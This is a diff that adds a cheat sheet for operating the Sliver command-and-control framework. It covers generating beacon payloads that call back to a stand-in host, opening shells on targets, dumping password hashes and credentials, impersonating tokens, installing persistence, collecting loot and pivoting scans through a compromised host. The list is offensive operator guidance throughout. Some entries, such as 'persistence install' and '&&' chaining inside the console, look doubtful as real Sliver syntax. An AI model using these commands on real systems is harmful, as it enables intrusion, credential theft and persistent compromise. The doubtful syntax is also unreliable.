@@ -1,0 +1,212 @@
+[X] Sliver C2 Command List
+
+[\] sliver-server
+[/] Start Sliver C2 server
+
+[\] sliver-client
+[/] Launch Sliver client console
+
+[\] sliver-server --help
+[/] Show server help options
+
+# -------------------------
+# SERVER / MULTIPLAYER
+# -------------------------
+
+[\] sliver-server daemon
+[/] Run Sliver server in background
+
+[\] sliver-server operator --name admin --lhost 0.0.0.0 --lport 31337
+[/] Create operator account
+
+[\] sliver-client --lhost 127.0.0.1 --lport 31337
+[/] Connect client to server
+
+# -------------------------
+# LISTENERS / HANDLERS
+# -------------------------
+
+[\] http
+[/] Start HTTP listener setup
+
+[\] https
+[/] Start HTTPS listener setup
+
+[\] mtls
+[/] Start mutual TLS listener
+
+[\] dns
+[/] Start DNS listener
+
+[\] wg
+[/] Start WireGuard listener
+
+[\] jobs
+[/] List active listeners/jobs
+
+[\] jobs kill <id>
+[/] Stop a listener/job
+
+# -------------------------
+# PAYLOAD GENERATION
+# -------------------------
+
+[\] generate --http example.com --save /tmp/payload
+[/] Generate HTTP beacon payload
+
+[\] generate --mtls example.com --save /tmp/payload
+[/] Generate mTLS payload
+
+[\] generate --dns example.com --save /tmp/payload
+[/] Generate DNS beacon
+
+[\] generate --os windows --format exe
+[/] Generate Windows executable payload
+
+[\] generate --os linux --format elf
+[/] Generate Linux ELF payload
+
+# -------------------------
+# SESSIONS / BEACONS
+# -------------------------
+
+[\] sessions
+[/] List active sessions
+
+[\] beacons
+[/] List active beacons
+
+[\] use <session_id>
+[/] Interact with session
+
+[\] interact <beacon_id>
+[/] Interact with beacon
+
+[\] kill <session_id>
+[/] Terminate session
+
+# -------------------------
+# POST-EXPLOITATION
+# -------------------------
+
+[\] shell
+[/] Open interactive shell on target
+
+[\] ls
+[/] List files on target
+
+[\] cd /path
+[/] Change directory
+
+[\] download /remote/file
+[/] Download file from target
+
+[\] upload /local/file
+[/] Upload file to target
+
+[\] ps
+[/] List running processes
+
+[\] screenshot
+[/] Capture screen from target
+
+# -------------------------
+# PRIVILEGE ESCALATION
+# -------------------------
+
+[\] getsystem
+[/] Attempt privilege escalation (Windows)
+
+[\] runas
+[/] Execute as another user
+
+[\] elevate
+[/] Try built-in privilege escalation techniques
+
+# -------------------------
+# PIVOTING / NETWORK
+# -------------------------
+
+[\] portfwd add -l 8080 -r 127.0.0.1:80
+[/] Forward local port to remote service
+
+[\] socks5 start
+[/] Start SOCKS5 proxy through session
+
+[\] wg start
+[/] Start WireGuard tunnel
+
+# -------------------------
+# CREDENTIALS / TOKENS
+# -------------------------
+
+[\] creds
+[/] List harvested credentials
+
+[\] hashdump
+[/] Dump password hashes
+
+[\] make-token
+[/] Create and impersonate token
+
+# -------------------------
+# PERSISTENCE
+# -------------------------
+
+[\] persistence install
+[/] Install persistence on target
+
+[\] persistence remove
+[/] Remove persistence
+
+# -------------------------
+# LOOT / DATA MANAGEMENT
+# -------------------------
+
+[\] loot
+[/] List collected loot
+
+[\] loot download <id>
+[/] Download stored loot
+
+# -------------------------
+# AUTOMATION / SCRIPTING
+# -------------------------
+
+[\] alias
+[/] Create command aliases
+
+[\] profiles
+[/] Manage C2 profiles
+
+[\] config
+[/] Show/modify client configuration
+
+# -------------------------
+# CLEANUP
+# -------------------------
+
+[\] kill all
+[/] Terminate all sessions
+
+[\] jobs killall
+[/] Stop all listeners/jobs
+
+[\] exit
+[/] Exit Sliver client
+
+# -------------------------
+# PIPELINE EXAMPLES
+# -------------------------
+
+[\] sliver-server daemon && sliver-client
+[/] Start server and connect client
+
+[\] http && generate --http example.com --save payload
+[/] Start HTTP listener and generate payload
+
+[\] use 1 && shell
+[/] Interact with session and spawn shell
+
+[\] socks5 start && proxychains nmap -sT target
+[/] Route traffic through compromised host
